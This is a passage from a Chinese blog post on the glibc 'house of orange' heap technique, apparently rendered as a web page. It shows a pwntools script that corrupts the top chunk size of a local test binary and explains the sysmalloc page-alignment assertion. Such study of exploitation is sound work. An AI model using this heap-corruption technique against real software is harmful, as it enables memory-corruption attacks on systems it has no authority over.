class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>让我们来看看发生了什么</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br><br>io = process([<br>    <span class="hljs-string">&#x27;./ld-linux-x86-64.so.2&#x27;</span>,<br>    <span class="hljs-string">&#x27;--library-path&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>,<br>    <span class="hljs-string">&#x27;./test5&#x27;</span><br>])<br>def <span class="hljs-title function_">add</span><span class="hljs-params">(size,content)</span>:<br>    io.<span class="hljs-title function_">sendlineafter</span><span class="hljs-params">(b<span class="hljs-string">&#x27;&gt;&#x27;</span>,b<span class="hljs-string">&#x27;1&#x27;</span>)</span><br>    io.<span class="hljs-title function_">sendlineafter</span><span class="hljs-params">(b<span class="hljs-string">&#x27;Size:&#x27;</span>,str(size))</span><br>    io.<span class="hljs-title function_">sendafter</span><span class="hljs-params">(b<span class="hljs-string">&#x27;Content:&#x27;</span>,content)</span><br><br><span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-number">100</span>,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">60</span>)</span><br><span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-number">24</span>,b<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">24</span>+p64(<span class="hljs-number">0xf71</span>))</span><br>gdb.<span class="hljs-title function_">attach</span><span class="hljs-params">(io)</span><br><span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-number">0xf90</span>,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>)</span><br><br>io.<span class="hljs-title function_">recvuntil</span><span class="hljs-params">(b<span class="hljs-string">&#x27;1. Add&#x27;</span>)</span><br><br><br>io.<span class="hljs-title function_">interactive</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure>
+
+<p>这个脚本是页对齐的情况下，我们可以看到</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250618212121-4ewwsp2.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250618212204-90ryqs5.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250618212243-1gts4un.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250618212446-gvkih5a.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>可以看到，确实会生成一个unsortedbin，然后再old top chunk下面是我们之前提到过的两个fencepost chunk，只有MINSIZE大小，然后在我们的原来的top chunk后面是我们扩展出来的新的top chunk切割下来的分配的chunk，最后面就是我们新的top chunk了，可以看到，这样的结构和我们上面画的结构是一样的</p>
+<p>然后，打算尝试一下如果我修改的top chunk不为页对齐，有什么影响</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">add(<span class="hljs-number">24</span>,b<span class="hljs-number">&#x27;b</span><span class="hljs-string">&#x27;*24+p64(0xf71-0x20))</span><br></code></pre></td></tr></table></figure>
+
+<p>竟然真的报错了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">b<span class="hljs-string">&quot;test5: malloc.c:2401: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&#x27; failed.\n&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>原来是通过这一句检查的页对齐<code>((unsigned long) old_end &amp; (pagesize - 1)) == 0</code>​</p>
+<p><strong>所以为什么 glibc 会检查你 fake 的</strong> <strong>​<code>top chunk</code>​</strong>​ <strong>是否页对齐，但扩容时却是从原本真实的 top chunk 后面继续增长。</strong></p>
+<p>其实这个问题还挺简单的，当时看源码不仔细所以略过了这一点，出现这个问题的原因是检查的时候使用的old_top&#x3D;top chunk的地址 + top chunk size去进行的一系列相关的检查，但是检查结束后，真正开始扩容的时候，是直接使用之前就标志好了的sbrk，所以是从原来的top chunk后面增长</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">brk = (<span class="hljs-type">char</span> *) (MORECORE (size));  <span class="hljs-comment">// 实际调用 sbrk(size)</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="结束啦"><a href="#结束啦" class="headerlink" title="结束啦"></a>结束啦</h2><p>按理来说，house of orange的利用手法应该还需要结合IO的，但是我IO那一块还不太会，就只看了一下，所以这里就先不讲了。本来如果使用house of orange挺简单的，但是直接利用又不了解具体的原理总感觉隔着一层雾，感觉很不透彻，所以写着写着就这么多了。不管了，这里到目前就是结束啦！</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.kn0sky.com/?p=b17b15bb-5fbc-4c77-94f1-d4fdcfe33448">堆利用详解：the house of orange</a></p>
+<p>‍</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/" class="category-chain-item">技术学习</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
+      
+        <a href="/tags/house-of-XX/" class="print-no-link">#house of XX</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>house of orange</div>
+      <div>http://example.com/post/house-of-orange-2s1kns.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>N1mbus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年6月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/silent-thoughts-zrtgyp.html" title="碎碎念">
+                        <span class="hidden-mobile">碎碎念</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"HGQ2AAsXTVipJuHOCxNQPl8A-gzGzoHsz","appKey":"xkvgsYTbMeB59u2gc4HqxaBN","path":"window.location.pathname","placeholder":"说点什么吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
